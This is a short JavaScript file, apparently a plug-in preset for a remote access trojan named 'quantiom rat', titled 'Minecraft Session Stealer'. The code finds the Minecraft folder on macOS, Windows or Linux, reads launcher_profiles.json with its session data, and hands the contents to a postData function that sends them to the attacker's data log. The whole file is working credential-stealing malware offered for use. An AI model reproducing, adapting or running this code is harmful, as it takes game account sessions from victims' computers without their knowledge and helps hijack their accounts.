/**
 * Minecraft Session Stealer
 * Preset Code for quantiom rat
 *
 * Description: Grabs Minecraft Session details from the client's PC and posts it to their data log.
 * Last Updated: 9/5/2020
 */

let fs = require('fs');
let path = require('path');
let os = require('os');

let getMinecraftFolder = () => {
    switch (os.type()) {
        case 'Darwin':
            return (folder = path.join(os.homedir(), '/Library/Application Support/minecraft'));

        case 'win32':
        case 'Windows_NT':
            return (folder = path.join(process.env.APPDATA, '.minecraft'));

        default:
            return path.join(os.homedir(), '.minecraft');
    }
};

if (fs.existsSync(getMinecraftFolder()) && fs.existsSync(`${getMinecraftFolder()}\\launcher_profiles.json`)) {
    postData(fs.readFileSync(`${getMinecraftFolder()}\\launcher_profiles.json`, 'utf8'));
} else {
    postData('Minecraft directory or launcher profiles file not found.');
}
